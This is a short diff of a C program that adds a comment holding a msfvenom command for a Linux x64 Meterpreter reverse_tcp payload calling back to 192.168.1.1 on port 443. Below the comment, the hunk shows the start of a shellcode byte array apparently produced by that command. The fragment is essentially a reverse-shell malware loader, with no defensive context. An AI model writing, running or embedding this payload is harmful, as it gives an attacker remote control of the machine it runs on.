@@ -8,6 +8,7 @@
 
 int main (int argc, char **argv)
 {
+  //msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 PREPENDFORK=true -f c -o c_shellcode.txt
   unsigned char buf[] = 
 "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
 "\x58\x0f\x05\x04\x70\x0f\x05\x6a\x39\x58\x0f\x05\x48\x85\xc0"
